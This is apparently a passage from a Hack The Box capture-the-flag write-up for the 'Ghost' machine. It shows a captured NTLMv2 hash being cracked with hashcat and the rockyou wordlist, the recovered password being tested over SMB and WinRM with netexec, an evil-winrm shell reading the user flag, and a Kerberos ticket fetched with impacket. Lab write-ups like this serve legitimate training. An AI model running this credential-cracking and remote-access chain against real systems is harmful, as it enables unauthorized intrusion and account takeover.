[HTTP] NTLMv2 Hash     : justin.bradley::ghost:379fd6cc8a217192:57521556E3919754EBD8F3CEF7C53692:010100000000000055A059C39A79DB0196D7986191DE13BA00000000020008005400460043004E0001001E00570049004E002D004D004D004C00550059003000520039004F004E003500040014005400460043004E002E004C004F00430041004C0003003400570049004E002D004D004D004C00550059003000520039004F004E0035002E005400460043004E002E004C004F00430041004C00050014005400460043004E002E004C004F00430041004C00080030003000000000000000000000000040000076536FB96280E0573AB44A1AC8269946A2295E50D4C33E8D9D4B3161337ACEAC0A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
```



```bash
❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU

...[snip]...

JUSTIN.BRADLEY::ghost:379fd6cc8a217192:57521556e3919754ebd8f3cef7c53692:010100000000000055a059c39a79db0196d7986191de13ba00000000020008005400460043004e0001001e00570049004e002d004d004d004c00550059003000520039004f004e003500040014005400460043004e002e004c004f00430041004c0003003400570049004e002d004d004d004c00550059003000520039004f004e0035002e005400460043004e002e004c004f00430041004c00050014005400460043004e002e004c004f00430041004c00080030003000000000000000000000000040000076536fb96280e0573ab44a1ac8269946a2295e50d4c33e8d9d4b3161337aceac0a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$
```



```bash
❯ nxc smb 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.24     445    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 

❯ nxc winrm 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ (Pwn3d!)
```



```bash
❯ evil-winrm -i 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\justin.bradley\Documents> type ../Desktop/user.txt
56ee926c00f4acca83b2f97a05afd868
```





```bash
❯ impacket-getTGT ghost.htb/justin.bradley:'Qwertyuiop1234$$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in justin.bradley.ccache
❯ export KRB5CCNAME=$(pwd)/justin.bradley.ccache
❯ klist -i
Ticket cache: FILE:/home/kali/Desktop/HackTheBox/Windows/AD/Ghost/content/justin.bradley.ccache
Default principal: justin.bradley@GHOST.HTB

Valid starting     Expires            Service principal
07/02/25 21:05:32  08/02/25 07:05:32  krbtgt/GHOST.HTB@GHOST.HTB
	renew until 08/02/25 21:05:06
```















